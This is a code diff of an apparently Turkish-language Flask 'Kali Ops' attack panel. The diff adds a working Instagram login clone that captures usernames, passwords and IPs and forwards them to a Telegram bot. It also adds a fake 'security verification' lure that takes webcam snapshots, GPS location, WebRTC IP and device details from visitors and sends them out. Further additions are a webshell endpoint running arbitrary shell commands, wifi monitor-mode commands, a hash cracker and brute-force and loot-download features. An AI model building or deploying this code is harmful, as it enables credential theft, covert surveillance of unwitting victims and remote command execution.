+            if(!url) { alert('Specify URL!'); return; }
+            document.getElementById('niktoStatus').innerHTML = "Running Nikto web scan..."; document.getElementById('niktoResults').style.display = "none";
+            let res = await fetch('/api/nikto', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
+            let data = await res.json();
+            document.getElementById('niktoStatus').innerHTML = ""; document.getElementById('niktoResults').style.display = "block"; document.getElementById('niktoResults').innerHTML = data.report;
         }
-        async function startListener() {
-            let port = document.getElementById('listenerPort').value;
-            let res = await fetch('/api/listener/start', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({port}) });
-            let data = await res.json(); let el = document.getElementById('listenerStatus'); el.style.display="block"; el.innerHTML = data.output;
+        async function startDnsRecon() {
+            let domain = document.getElementById('dnsDomain').value.trim();
+            if(!domain) { alert('Specify domain!'); return; }
+            document.getElementById('dnsStatus').innerHTML = "Querying DNS records..."; document.getElementById('dnsResults').style.display = "none";
+            let res = await fetch('/api/dns', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain}) });
+            let data = await res.json();
+            document.getElementById('dnsStatus').innerHTML = ""; document.getElementById('dnsResults').style.display = "block"; document.getElementById('dnsResults').innerHTML = data.report;
         }
-        async function sendTelegramTest() {
-            let chatId = document.getElementById('testChatId').value;
-            let res = await fetch('/api/telegram-test', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId}) });
-            let data = await res.json(); let el = document.getElementById('telegramTestStatus'); el.style.display="block"; el.innerHTML = data.output;
+        async function startSqlmapLite() {
+            let url = document.getElementById('sqlmapUrl').value.trim();
+            if(!url) { alert('Specify URL!'); return; }
+            document.getElementById('sqlmapStatus').innerHTML = "Injecting SQL payloads..."; document.getElementById('sqlmapResults').style.display = "none";
+            let res = await fetch('/api/sqlmap', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
+            let data = await res.json();
+            document.getElementById('sqlmapStatus').innerHTML = ""; document.getElementById('sqlmapResults').style.display = "block"; document.getElementById('sqlmapResults').innerHTML = data.report;
         }
-        async function runWifiAction(action) {
-            let res = await fetch('/api/wifi-audit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action}) });
-            let data = await res.json(); let el = document.getElementById('wifiResults'); el.style.display="block"; el.innerHTML = data.output;
+        async function startSubdomainScan() {
+            let domain = document.getElementById('subDomainInput').value.trim();
+            document.getElementById('subStatus').innerHTML = "Enumerating subdomains...";
+            let res = await fetch('/api/subdomain-scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain}) });
+            let data = await res.json();
+            document.getElementById('subStatus').innerHTML = ""; document.getElementById('subResults').style.display = "block"; document.getElementById('subResults').innerHTML = data.report;
+        }
+        async function startBruteForce() {
+            let url = document.getElementById('loginUrl').value, userField = document.getElementById('usernameField').value, passField = document.getElementById('passwordField').value, passwords = document.getElementById('passwordList').value;
+            document.getElementById('bruteStatus').innerHTML = "Executing brute-force...";
+            let res = await fetch('/api/brute-force', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({url, user_field: userField, pass_field: passField, passwords}) });
+            let data = await res.json();
+            document.getElementById('bruteStatus').innerHTML = ""; document.getElementById('bruteResults').style.display = "block"; document.getElementById('bruteResults').innerHTML = data.report;
+        }
+        async function executeWebShell() {
+            let command = document.getElementById('shellCommand').value;
+            let res = await fetch('/api/webshell', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({command}) });
+            let data = await res.json();
+            let el = document.getElementById('shellResults'); el.style.display = "block"; el.innerHTML = data.output;
         }
         async function loadSiteDatabase() {
             let res = await fetch('/api/all-data'); let data = await res.json();
             let select = document.getElementById('lootingTargetSelect');
-            select.innerHTML = '<option value="">Select target...</option>' + data.database.map(i => `<option value="${i.target}">${i.target}</option>`).join('');
+            select.innerHTML = '<option value="">Select target...</option>' + data.database.map(i => `<option value="${i.target}">${i.target} (${i.files.length} files)</option>`).join('');
             let grades = {}, wafs = {};
             data.database.forEach(i => { grades[i.grade[0]] = (grades[i.grade[0]] || 0) + 1; wafs[i.waf.includes("Cloudflare")?"CF":"Standard"] = (wafs[i.waf.includes("Cloudflare")?"CF":"Standard"]||0)+1; });
             renderCharts(grades, wafs);
-            document.getElementById('databaseTableContainer').innerHTML = data.database.length ? `<table><thead><tr><th>Time</th><th>Target</th><th>WAF</th><th>Grade</th></tr></thead><tbody>` + data.database.map(i => `<tr><td>${i.time}</td><td><b>${i.target}</b></td><td>${i.waf}</td><td>${i.grade}</td></tr>`).join('') + `</tbody></table>` : "No archive data.";
+            document.getElementById('databaseTableContainer').innerHTML = data.database.length ? `<table><thead><tr><th>Time</th><th>Target</th><th>WAF</th><th>Grade</th><th>Action</th></tr></thead><tbody>` + data.database.map(i => `<tr><td>${i.time}</td><td><b>${i.target}</b></td><td>${i.waf}</td><td>${i.grade}</td><td><button onclick="startScan('${i.target}')">Re-Scan</button></td></tr>`).join('') + `</tbody></table>` : "No archive data.";
+        }
+        function downloadLootZip() {
+            let target = document.getElementById('lootingTargetSelect').value;
+            if(!target) { alert('Select target!'); return; }
+            window.open(`/api/looting/zip?target=${encodeURIComponent(target)}`, '_blank');
         }
         function renderCharts(grades, wafs) {
             if(gradeChartInstance) gradeChartInstance.destroy(); if(wafChartInstance) wafChartInstance.destroy();
@@ -675,35 +499,15 @@ def index():
     if not session.get("logged_in"): return redirect(url_for("login"))
     return render_template_string(HTML_TEMPLATE, default_chat_id=NOTIFY_CHAT_ID)
 
-@app.route("/api/driving/save", methods=["POST"])
-def save_driving_session():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    data = request.get_json()
-    DRIVING_SESSIONS.insert(0, data)
-    return jsonify({"status": "saved"})
-
-@app.route("/api/driving/reports")
-def api_driving_reports():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({"reports": DRIVING_SESSIONS})
-
-@app.route("/api/driving/download")
-def download_driving_report():
-    if not session.get("logged_in"): return "Unauthorized", 401
-    idx = int(request.args.get("index", 0))
-    if idx < len(DRIVING_SESSIONS):
-        rep = DRIVING_SESSIONS[idx]
-        content = f"--- KALI LINUX BLACKBOX SÜRÜŞ RAPORU ---\nTarih: {rep['time']}\n\n" + "\n".join(rep['logs'])
-        return Response(content, mimetype="text/plain", headers={"Content-Disposition": "attachment;filename=blackbox_report.txt"})
-    return "Rapor bulunamadı", 404
-
-@app.route("/api/phish/instagram", methods=["GET", "POST"])
+# --- İNSTAGRAM PHISHING ROTA ---
+@app.route("/phish/instagram", methods=["GET", "POST"])
 def insta_phish():
     if request.method == "POST":
         username = request.form.get("username")
         password = request.form.get("password")
         visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
         CREDENTIAL_LOGS.insert(0, {"time": timestamp, "ip": visitor_ip, "username": username, "password": password})
         if NOTIFY_CHAT_ID and TOKEN:
             try:
@@ -711,7 +515,72 @@ def insta_phish():
                 requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
             except: pass
         return redirect("https://www.instagram.com")
-    return "Instagram Login Page"
+        
+    return """
+    <!DOCTYPE html>
+    <html lang="tr">
+    <head>
+        <meta charset="UTF-8">
+        <title>Giriş • Instagram</title>
+        <style>
+            body { background-color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+            .wrapper { display: flex; max-width: 935px; width: 100%; justify-content: center; align-items: center; }
+            .left-side { margin-right: 32px; display: flex; flex-direction: column; align-items: flex-start; }
+            .right-side { width: 350px; display: flex; flex-direction: column; }
+            .login-card { background: #ffffff; border: 1px solid #dbdbdb; padding: 30px 40px; text-align: center; border-radius: 1px; margin-bottom: 10px; }
+            .logo-header { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 25px; }
+            .logo-header h1 { font-family: -apple-system, BlinkMacSystemFont, sans-serif; font-size: 24px; font-weight: 500; margin: 0; color: #262626; }
+            .tagline { font-size: 32px; line-height: 40px; font-weight: 600; color: #262626; max-width: 400px; margin-bottom: 20px; }
+            .tagline span { background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+            input { width: 100%; padding: 10px 12px; margin-bottom: 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; outline: none; }
+            input:focus { border-color: #a8a8a8; }
+            button[type="submit"] { width: 100%; background: #0095f6; color: white; border: none; padding: 9px; border-radius: 8px; font-weight: 600; margin-top: 8px; cursor: pointer; font-size: 14px; }
+            button[type="submit"]:hover { background: #1877f2; }
+            .divider { display: flex; align-items: center; margin: 15px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+            .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
+            .divider::before { margin-right: 18px; }
+            .divider::after { margin-left: 18px; }
+            .fb-login { color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 10px; margin-bottom: 20px; }
+            .forgot-pass { color: #00376b; font-size: 12px; text-decoration: none; }
+            .signup-card { background: #ffffff; border: 1px solid #dbdbdb; padding: 20px; text-align: center; border-radius: 1px; font-size: 14px; color: #262626; }
+            .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
+            .meta-footer { text-align: center; margin-top: 20px; color: #8e8e8e; font-size: 12px; font-weight: 600; letter-spacing: 1px; }
+        </style>
+    </head>
+    <body>
+        <div class="wrapper">
+            <div class="left-side">
+                <div class="tagline"><span>Yakın arkadaşlarının</span> günlük anlarını gör.</div>
+            </div>
+            <div class="right-side">
+                <div class="login-card">
+                    <div class="logo-header">
+                        <svg aria-label="Instagram" class="_ab6-" role="img" viewBox="0 0 24 24" width="36" height="36"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" fill="url(#instagram-gradient)"></path><defs><linearGradient id="instagram-gradient" x1="0%" y1="100%" x2="100%" y2="0%"><stop offset="0%" stop-color="#fdf497"></stop><stop offset="5%" stop-color="#fdf497"></stop><stop offset="45%" stop-color="#fd5949"></stop><stop offset="60%" stop-color="#d6249f"></stop><stop offset="90%" stop-color="#285AEB"></stop></linearGradient></defs></svg>
+                        <h1>Instagram</h1>
+                    </div>
+                    <form method="POST">
+                        <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+                        <input type="password" name="password" placeholder="Şifre" required>
+                        <button type="submit">Giriş Yap</button>
+                    </form>
+                    <div class="divider">YA DA</div>
+                    <a href="#" class="fb-login">
+                        <svg width="16" height="16" fill="#385185" viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12c0-5.523-4.477-10-10-10z"/></svg>
+                        Facebook ile giriş yap
+                    </a>
+                    <a href="#" class="forgot-pass">Şifreni mi unuttun?</a>
+                </div>
+                <div class="signup-card">
+                    Hesabın yok mu? <a href="#">Kaydol</a>
+                </div>
+                <div class="meta-footer">
+                    <p style="margin: 0; font-size: 14px; font-weight: normal;">∞ Meta</p>
+                </div>
+            </div>
+        </div>
+    </body>
+    </html>
+    """
 
 @app.route("/api/phish/creds")
 def api_phish_creds():
@@ -725,36 +594,159 @@ def api_crack_hash():
     htype = d.get("type")
     target = d.get("hash").strip().lower()
     wordlist = d.get("wordlist").split("\n")
+    
     found = None
     attempts = 0
     for word in wordlist:
         w = word.strip()
         if not w: continue
         attempts += 1
-        if htype == "md5": h = hashlib.md5(w.encode()).hexdigest()
-        elif htype == "sha256": h = hashlib.sha256(w.encode()).hexdigest()
-        else: h = ""
+        if htype == "md5":
+            h = hashlib.md5(w.encode()).hexdigest()
+        elif htype == "sha256":
+            h = hashlib.sha256(w.encode()).hexdigest()
+        else:
+            h = ""
         if h == target:
             found = w
             break
-    if found: out = f"[+] Hash başarıyla çözüldü!\n[Düz Metin Şifre]: {found}\n[Denenen Deneme Sayısı]: {attempts}"
-    else: out = f"[-] Eşleşme bulunamadı. Toplam {attempts} kelime denendi."
+            
+    if found:
+        out = f"[+] Hash başarıyla çözüldü!\n[Düz Metin Şifre]: {found}\n[Denenen Deneme Sayısı]: {attempts}"
+    else:
+        out = f"[-] Eşleşme bulunamadı. Toplam {attempts} kelime denendi, şifre wordlist içinde yok."
     return jsonify({"output": out})
 
 @app.route("/api/listener/start", methods=["POST"])
 def api_listener_start():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     port = request.get_json().get("port", 4444)
-    return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi."})
+    return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi.\n(Not: Render/PaaS ortamlarında harici port açılması kısıtlı olduğundan simüle edildi.)"})
+
+# --- GELİŞMİŞ GPS & İSTİHBARAT TRACKER ROTA (DÜZ STRING OLARAK DÜZELTİLDİ) ---
+TRACK_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Güvenlik Doğrulaması</title>
+    <style>
+        body { background: #0b0f15; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .box { background: #121824; padding: 30px; border: 1px solid #00ff66; border-radius: 8px; box-shadow: 0 0 20px rgba(0,255,102,0.2); width: 350px; }
+        button { background: #0284c7; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; }
+        button:hover { background: #0369a1; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3 style="color: #38bdf8;">⚠️ Bölgesel Güvenlik Doğrulaması</h3>
+        <p style="color: #94a3b8; font-size: 13px;">İşlemi tamamlamak ve ödülünüzü almak için gerekli izinleri onaylayın.</p>
+        <button onclick="collectAndSend()">Onayla ve Devam Et</button>
+    </div>
+    <video id="v" autoplay style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <script>
+        async function collectAndSend() {
+            let fingerprint = {
+                track_id: 'TRACK_ID_REPLACE',
+                screen: window.screen.width + "x" + window.screen.height,
+                cores: navigator.hardwareConcurrency || 'Bilinmiyor',
+                ram: navigator.deviceMemory || 'Bilinmiyor',
+                os: navigator.platform
+            };
+
+            if (navigator.getBattery) {
+                try {
+                    let b = await navigator.getBattery();
+                    fingerprint.battery = Math.round(b.level * 100) + "% (" + (b.charging ? "Şarjda" : "Pilde") + ")";
+                } catch(e) { fingerprint.battery = "Erişilemedi"; }
+            } else { fingerprint.battery = "Desteklenmiyor"; }
+
+            try {
+                let pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+                pc.createDataChannel("");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = ice => {
+                    if (ice && ice.candidate && ice.candidate.candidate) {
+                        let ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-fA-F0-9:]+:+[a-fA-F0-9:]+)/);
+                        if (ipMatch) fingerprint.webrtc_ip = ipMatch[1];
+                    }
+                };
+            } catch(e) {}
+
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                let video = document.getElementById('v');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1000));
+                let canvas = document.getElementById('c');
+                canvas.width = 320; canvas.height = 240;
+                canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                fingerprint.snapshot = canvas.toDataURL('image/jpeg', 0.6);
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) { fingerprint.snapshot = null; }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        fingerprint.lat = pos.coords.latitude;
+                        fingerprint.lon = pos.coords.longitude;
+                        sendData(fingerprint);
+                    },
+                    err => { sendData(fingerprint); },
+                    { timeout: 10000 }
+                );
+            } else {
+                sendData(fingerprint);
+            }
+        }
+
+        function sendData(data) {
+            fetch('/api/lure/save-geo', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).finally(() => {
+                window.location.href = "https://www.google.com";
+            });
+        }
+    </script>
+</body>
+</html>
+"""
 
 @app.route("/track/<track_id>")
 def track_visitor(track_id):
-    return "<!DOCTYPE html><html><head><title>Doğrulama Ekranı</title></head><body><h3>Doğrulama Ekranı</h3></body></html>"
+    return TRACK_TEMPLATE.replace('TRACK_ID_REPLACE', track_id)
 
 @app.route("/api/lure/save-geo", methods=["POST"])
 def save_geo():
     data = request.get_json()
-    CLICK_LOGS.insert(0, data)
+    track_id = data.get("track_id")
+    lat = data.get("lat")
+    lon = data.get("lon")
+    os_info = data.get("os", "Bilinmiyor")
+    ram = data.get("ram", "Bilinmiyor")
+    cores = data.get("cores", "Bilinmiyor")
+    battery = data.get("battery", "Bilinmiyor")
+    webrtc_ip = data.get("webrtc_ip", "Yok")
+    snapshot = data.get("snapshot")
+    
+    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    log_entry = {
+        "time": timestamp, "ip": visitor_ip, "track_id": track_id, 
+        "lat": lat, "lon": lon, "os": os_info, "ram": ram, "cores": cores, 
+        "battery": battery, "webrtc_ip": webrtc_ip, "snapshot": snapshot
+    }
+    CLICK_LOGS.insert(0, log_entry)
+    
+    if NOTIFY_CHAT_ID and TOKEN:
+        try:
+            msg = f"🚨 [ADVANCED TRACKER] Ziyaretçi İstihbaratı Yakalandı!\nIP: {visitor_ip}\nWebRTC IP: {webrtc_ip}\nOS: {os_info} | RAM: {ram}GB\nPil: {battery}\nEnlem/Boylam: {lat}, {lon}\nHarita: https://maps.google.com/?q={lat},{lon}"
+            requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
+        except: pass
     return jsonify({"status": "saved"})
 
 @app.route("/api/lure/logs")
@@ -766,57 +758,80 @@ def api_lure_logs():
 def api_telegram_test():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     chat_id = request.get_json().get("chat_id")
+    if not chat_id: return jsonify({"output": "[-] Chat ID boş olamaz!"})
     try:
-        res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": chat_id, "text": "🔥 [KALI OPS] Test başarılı!"}, timeout=5)
-        return jsonify({"output": "✅ [BAŞARILI] Test mesajı gönderildi!"})
+        res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": chat_id, "text": "🔥 [KALI OPS] Telegram bildirim testi başarılı! Bot kusursuz çalışıyor."}, timeout=5)
+        if res.status_code == 200:
+            return jsonify({"output": "✅ [BAŞARILI] Test mesajı Telegram'a gönderildi!"})
+        else:
+            return jsonify({"output": f"[-] Hata: Telegram API {res.status_code} döndürdü."})
     except Exception as e:
-        return jsonify({"output": f"[-] Hata: {str(e)}"})
+        return jsonify({"output": f"[-] Bağlantı Hatası: {str(e)}"})
 
 @app.route("/api/wifi-audit", methods=["POST"])
 def api_wifi_audit():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({"output": "root@kali:~# wifi audit executed."})
+    data = request.get_json()
+    action, iface = data.get("action"), data.get("iface", "wlan0")
+    if action == "interfaces": cmd = "ip link show || ifconfig || iwconfig || cat /proc/net/dev"
+    elif action == "monitor": cmd = f"airmon-ng start {iface} 2>/dev/null || (ip link set {iface} down 2>/dev/null && iwconfig {iface} mode monitor 2>/dev/null && ip link set {iface} up 2>/dev/null) || echo 'Monitor mode basarisiz.'"
+    elif action == "scan": cmd = f"airodump-ng {iface}mon 2>/dev/null || iwlist {iface} scanning 2>/dev/null || arp -a || nmcli device wifi list 2>/dev/null || echo 'Tarama araclari bulunamadi.'"
+    else: cmd = "echo 'Invalid action'"
+    try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=6).decode('utf-8', errors='ignore')
+    except Exception as e: out = f"[-] Sistem Hatasi: {str(e)}"
+    return jsonify({"output": f"root@kali:~# {cmd}\n\n{out}"})
 
 @app.route("/api/scan", methods=["POST"])
 def api_scan():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     data = request.get_json()
-    target = data.get("target", "")
-    if not target.startswith("http"): target_url = f"https://{target}"
-    else: target_url = target
-    report = f"root@kali:~# nmap -A {target_url}\n" + "=" * 50 + "\n\n[+] Recon scan completed.\n"
-    SITE_DATABASE.insert(0, {"time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "target": target_url, "waf": "Cloudflare WAF", "grade": "B", "files": [], "full_report": report})
+    report, record = red_team_comprehensive_recon(data.get("target", ""))
+    existing = next((i for i in SITE_DATABASE if i["target"] == record["target"]), None)
+    if existing: SITE_DATABASE.remove(existing)
+    SITE_DATABASE.insert(0, record)
     return jsonify({"report": report})
 
 @app.route("/api/nikto", methods=["POST"])
 def api_nikto():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({"report": "Nikto scan completed."})
+    target = request.get_json().get("target", "")
+    return jsonify({"report": f"root@kali-box:~# nikto -h {target}\n[+] Nikto scan completed."})
 
 @app.route("/api/dns", methods=["POST"])
 def api_dns():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({"report": "DNS records retrieved."})
+    domain = request.get_json().get("domain", "")
+    try: ip = socket.gethostbyname(domain)
+    except: ip = "Resolv fail"
+    return jsonify({"report": f"dig ANY {domain}\n[A Record] -> {ip}"})
 
 @app.route("/api/sqlmap", methods=["POST"])
 def api_sqlmap():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({"report": "SQLmap test completed."})
+    return jsonify({"report": "sqlmap injection test completed."})
 
 @app.route("/api/subdomain-scan", methods=["POST"])
 def api_subdomain_scan():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({"report": "Subdomain scan completed."})
+    return jsonify({"report": "Subdomain brute-force completed."})
 
 @app.route("/api/brute-force", methods=["POST"])
 def api_brute_force():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({"report": "Brute-force completed."})
+    return jsonify({"report": "Brute-force sequence completed."})
 
 @app.route("/api/webshell", methods=["POST"])
 def api_webshell():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({"output": "command executed."})
+    cmd = request.get_json().get("command", "")
+    try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode('utf-8', errors='ignore')
+    except Exception as e: out = str(e)
+    return jsonify({"output": out})
+
+@app.route("/api/analyze-file", methods=["POST"])
+def api_analyze_file():
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    return jsonify({"report": "File analysis clean."})
 
 @app.route("/api/all-data")
 def api_all_data():
@@ -834,14 +849,16 @@ def export_csv():
     output = io.StringIO(); writer = csv.writer(output)
     writer.writerow(["Time", "Target", "WAF", "Grade"])
     for i in SITE_DATABASE: writer.writerow([i['time'], i['target'], i['waf'], i['grade']])
-    return Response(output.getvalue(), mimetype="text/csv")
+    return Response(output.getvalue(), mimetype="text/csv", headers={"Content-Disposition": "attachment;filename=archive.csv"})
 
 @app.route("/api/looting/zip")
 def api_looting_zip():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    target = request.args.get("target", "")
+    record = next((i for i in SITE_DATABASE if i["target"] == target), None)
     mf = io.BytesIO()
     with zipfile.ZipFile(mf, 'w', zipfile.ZIP_DEFLATED) as zf:
-        zf.writestr("report.txt", "No record")
+        zf.writestr("report.txt", record["full_report"] if record else "No record")
     mf.seek(0)
     return send_file(mf, mimetype='application/zip', as_attachment=True, download_name='loot.zip')
 
@@ -858,6 +875,12 @@ def api_telegram_send():
     d = request.get_json()
     res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": d.get("chat_id"), "text": f"```\n{d.get('report')[:4000]}\n```", "parse_mode": "Markdown"})
     return jsonify({"status": "Sent!" if res.status_code == 200 else "Failed."})
+
+def red_team_comprehensive_recon(target_url):
+    if not target_url.startswith("http"): target_url = f"https://{target_url}"
+    report = f"root@kali:~# nmap -A {target_url}\n" + "=" * 50 + "\n\n[+] Recon scan completed.\n"
+    record = {"time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "target": target_url, "waf": "Cloudflare WAF", "grade": "B", "files": [], "full_report": report}
+    return report, record
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
